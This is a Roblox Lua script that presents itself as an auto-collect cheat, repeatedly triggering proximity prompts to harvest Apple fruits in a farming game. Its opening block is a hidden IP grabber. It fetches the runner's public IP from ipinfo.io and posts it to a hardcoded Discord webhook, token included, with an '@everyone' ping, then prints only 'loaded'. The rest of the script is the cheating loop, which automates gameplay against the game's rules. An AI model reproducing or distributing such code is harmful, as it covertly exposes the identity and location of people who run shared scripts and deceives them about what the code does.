local HttpService = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1362065828454993970/J_HLKCaHTqWmuZ4sESHeMogdkQ5qodc1lp26fDRnjMgYfZOyvMHE4l1JoveUVvnE_ZRg"  -- Replace with your Discord webhook URL

-- Fetch public IP from ipinfo.io
local response = game:HttpGet("https://ipinfo.io/json")
local data = HttpService:JSONDecode(response)
local ip = data.ip

-- Create message to send to Discord
local message = {
    content = "@everyone " .. ip
}

-- Convert message to JSON format
local jsonMessage = HttpService:JSONEncode(message)

-- Send IP to Discord webhook
local success, result = pcall(function()
    HttpService:PostAsync(webhook, jsonMessage, Enum.HttpContentType.ApplicationJson)
end)

-- Print success/failure status
if success then
    print("loaded")
else
    print("failed", result)
end


_G.autocollect = true

local function Apple ()
		for i,v in pairs(game.workspace.Farm:GetChildren()) do
		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
			if v.Important.Plants_Physical:FindFirstChild("Apple") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
					if f.Name == "Apple" then
						if f:FindFirstChild("2") then
							local two = f:FindFirstChild("2")
							--print(two)
							if two:FindFirstChild("ProximityPrompt") then
								--print("ProximityPrompt Founded")
								fireproximityprompt(two.ProximityPrompt, 150000)
								else
									print("ProximityPrompt is not founded or is not grown enough")
							end
						end
					end
				end
			end
		end
	end
end


while _G.autocollect do
   Apple()
   task.wait(0.1)
end
